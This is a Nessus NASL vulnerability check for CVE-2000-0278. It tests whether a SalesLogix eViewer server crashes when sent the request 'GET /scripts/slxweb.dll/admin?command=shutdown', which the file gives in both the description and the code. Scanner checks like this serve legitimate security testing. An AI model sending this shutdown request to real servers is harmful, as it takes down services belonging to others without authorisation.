#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10361);
 script_version ("$Revision: 1.34 $");
 script_cve_id("CVE-2000-0278");
 script_bugtraq_id(1089);
 script_osvdb_id(1273);
 
 script_name(english:"SalesLogix eViewer slxweb.dll Request Remote DoS");
 script_summary(english:"Crashes Eviewer");
 
 script_set_attribute( attribute:"synopsis", value:
"A web application running on the remote host has a denial of service
vulnerability." );
 script_set_attribute( attribute:"description", value:
"It was possible to crash the remote server by requesting :

  GET /scripts/slxweb.dll/admin?command=shutdown

A remote attacker could use this flaw to crash this host,
preventing your network from working properly." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Mar/353"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from the web server."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/04/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/03/31");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencies("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

 if ( http_is_dead(port:port) ) exit(0);
 start_denial();
 r = http_send_recv3(method: "GET", item:"/scripts/slxweb.dll/admin?command=shutdown",
 	        port:port);
 alive = end_denial();
if(!alive && http_is_dead(port:port))
{
	security_hole(port);
	set_kb_item(name:"Host/dead", value:TRUE);
}

